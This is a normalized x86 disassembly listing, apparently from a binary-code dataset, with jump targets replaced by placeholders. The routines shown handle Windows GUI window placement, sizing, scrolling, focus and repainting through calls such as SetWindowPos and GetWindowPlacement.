sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44fa80
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4657c8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44fa80
test eax eax
jne r-xdata
jmp r-xdata
sub_454970
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44fa80
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_4549c4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44fa80
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4657c8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44fa80
test eax eax
jne r-xdata
sub_454a10
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4547f8
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44fa80
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4657c8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44fa80
test eax eax
jne r-xdata
sub_454a6c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4657c8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44fa80
mov [ esi + 0xc ] eax
sub_454aa0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44df08
mov eax ebx
mov si 0xffd0
call sub_403518
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44e254
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_454b78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_451de4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_451da8
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403518
inc edi
dec ebx
jne r-xdata
sub_454bc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45194c
xor eax eax
push ebp
push sub_454c5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454b78
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e4d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c65
mov eax [ ebp - 0x4 ]
call sub_451954
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_454c6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_451974
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_451da8
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_454d5c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_418d54
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418be8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_418d74
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_418cf8
call sub_4550b4
jmp r-xdata
mov eax ebp
mov edx esi
call sub_418cf8
call sub_4550b4
sub_454e34
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_454d5c
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_454e94
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4550b4
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4550b4
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
test eax eax
jne r-xdata
sub_454ef8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44fa80
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
mov eax ebx
call sub_451de4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_451da8
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_451da8
test [ eax + 0x52 ] 0x4
je r-xdata
sub_454fbc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_44e254
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_454ff4
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4657c8
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_455034
push ebx
mov ebx eax
mov eax ebx
call sub_4657c8
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_469534
pop ebx
retn
mov eax ebx
call sub_4657f0
mov eax ebx
call sub_4550b4
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_45506c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_455090
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_455090
sub_4550c8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41766c
mov eax edi
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_451da8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_45515c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4550b4
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_455194
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4553b8
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403518
sub_455250
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_418d54
pop esi
pop ebx
retn
sub_455274
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_455250
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418be8
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_418d74
sub_4552e8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4553b8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44fa80
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_455348
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4553ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4553b3
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403518
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405ad0
sub_4553c4
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44df08
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_45547c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_418cf8
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418b9c
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403518
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4554dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4555d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403518
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4555d9
mov eax [ ebp - 0x14 ]
call sub_40331c
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_418d54
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418cf8
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403518
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_4555e8
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4554dc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_455614
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4657c8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4554dc
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4554dc
mov edx eax
mov eax esi
call sub_469434
sub_455658
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_451de4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4556a0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_454d5c
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44eb24
sub_4556e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45576c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_451de4
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_455b2e
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_451de4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4556e8
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_451da8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
